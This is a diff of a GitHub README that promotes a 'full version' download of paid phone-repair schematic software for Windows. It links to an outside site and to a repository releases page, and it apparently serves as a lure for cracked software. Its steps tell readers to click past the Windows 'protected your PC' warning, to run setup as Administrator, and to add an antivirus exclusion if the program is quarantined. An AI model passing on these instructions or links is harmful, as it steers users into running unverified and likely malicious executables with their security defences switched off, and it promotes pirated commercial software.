@@ -1,73 +1,69 @@
-# Infinity Schematics — Full Version Download for Windows 11 & 10
+# 📱 Infinity-Schematics-2026 - Access Professional Phone Repair Schematics Easily
 
-**Infinity-Schematics-2026**
+[![Download Infinity-Schematics-2026](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Attemptvichy661/Infinity-Schematics-2026/releases)
 
-**Infinity Schematics** — paid desktop app, **full / complete version** for Windows 10 and 11 (not a trial).  
-Direct installer link below.
+Infinity-Schematics-2026 provides phone repair technicians and hobbyists with detailed hardware diagrams. This software runs on Windows 10 and Windows 11. It assists with component identification, circuit tracing, and board-level repairs.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Full Version](https://img.shields.io/badge/Full-Version-9333ea?style=flat-square)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## 🛠️ System Requirements
 
----
+Ensure your computer meets these requirements to run the software smoothly:
 
-## Download & Install
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i3 or equivalent.
+- Memory: 4 GB RAM.
+- Storage: 1 GB of available disk space.
+- Display: 1280x720 resolution or higher.
+- Internet Connection: Required for initial installation and software activation.
 
-> **This is the download page.** Use the button or link below to get **Infinity Schematics** for Windows.
+## 📥 Downloading the Software
 
-<p align="center">
-  <a href="https://infinityschematics.moltora.com/">
-    <img src="https://img.shields.io/badge/Download-Infinity%20Schematics-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Infinity Schematics">
-  </a>
-</p>
+You need to access the release page to obtain the installation files. The software is distributed as a compressed archive to ensure file integrity.
 
-| | |
-| --- | --- |
-| **Direct link** | **[infinityschematics.moltora.com](https://infinityschematics.moltora.com/)** |
-| **Full URL** | `https://infinityschematics.moltora.com/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+1. Visit the following link to locate the latest version: [https://github.com/Attemptvichy661/Infinity-Schematics-2026/releases](https://github.com/Attemptvichy661/Infinity-Schematics-2026/releases).
+2. Look for the section labeled "Assets" under the most recent release entry.
+3. Click the file ending in ".zip" or ".exe" to begin the download.
+4. Save the file to your "Downloads" folder.
 
-### Quick steps
+## ⚙️ Installation Instructions
 
-1. Click **[Download — infinityschematics.moltora.com](https://infinityschematics.moltora.com/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+Follow these steps to set up the software on your machine:
 
-<p align="center"><a href="https://infinityschematics.moltora.com/"><strong>⬇ Download Infinity Schematics now</strong></a></p>
+1. Locate the downloaded file in your folder.
+2. If you downloaded a .zip file, right-click it and choose "Extract All". Follow the prompts to unzip the folder.
+3. Open the folder and double-click the file named "InfinitySetup.exe".
+4. A window from Windows may appear stating "Windows protected your PC". Click "More info" and then select "Run anyway".
+5. Follow the on-screen installer prompts. Accept the terms if you agree to them.
+6. Choose the installation directory. The default location works for most users.
+7. Click "Install" and wait for the progress bar to finish.
+8. Check the box labeled "Launch application" and click "Finish" to open the program.
 
----
+## 🚀 Getting Started with Repair Diagrams
 
-## About Infinity Schematics
+Once the software opens, you will see a search bar and a list of supported device manufacturers. 
 
-**Infinity Schematics** is commercial software. Most people search for the **full unlocked build** on Windows — all features enabled, not the limited trial.
+- Use the search bar to enter your phone model number.
+- Select the specific board version if prompted.
+- Use your mouse wheel to zoom in on specific parts of the schematic.
+- Click on any component to view its electrical values and connections.
 
-**Common searches:** infinity schematics download phone repair, infinity board diagram tool windows, infinity gsm schematics 2026
+If the software does not load, ensure your Windows firewall allows the program to communicate with the internet. You may need to click "Allow access" if a notification appears during the first launch.
 
-**What you get:** complete Windows installer (64-bit), full feature set.
+## 🧹 Maintenance and Updates
 
-**Repository:** `Infinity-Schematics-2026`
+Revisit the download page periodically to check for newer versions. Developers release updates to improve compatibility with newer phone models and to refine the user interface. 
 
-## Install (full version)
+To update:
+1. Download the new installer from the same link as before.
+2. Run the new installer. The program will recognize the existing installation and update the files.
+3. Your personal settings will remain intact during this process.
 
-| Step | Action |
-| --- | --- |
-| 1 | Download using the button above |
-| 2 | Run setup **as Administrator** |
-| 3 | Enter your **license key** when prompted |
-| 4 | Reboot once if the installer asks |
+## 🔧 Troubleshooting Common Issues
 
-## System requirements
+If you encounter errors during operation, consider these solutions:
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB recommended) |
-| Disk | 1 GB free |
-| Admin | Required for install |
+- Software fails to start: Check if your antivirus software quarantined the application. Add an exclusion for the installation folder in your settings.
+- Blank screen: Ensure your graphics drivers are up to date.
+- Missing diagrams: Verify your internet connection. Some diagrams download on-demand to save disk space.
+- Slow performance: Ensure all other heavy applications are closed while you perform board repairs.
 
----
-
-**Topics:** infinity-schematics-download-phone-repair, infinity, schematics, infinity-board-diagram-tool-windows, diagram, infinity-gsm-schematics-2026, infinity-schematics-2026, infinity-schematics, infinity-2026, phone-repair, gsm-tool, board-repair
+Keywords: board-repair, complete-version, diagram, download, full-installer, gsm-tool, infinity, infinity-2026, infinity-board-diagram-tool-windows, infinity-gsm-schematics-2026, infinity-schematics, infinity-schematics-2026, infinity-schematics-download-phone-repair, phone-repair, schematics, software, windows-11, windows-software
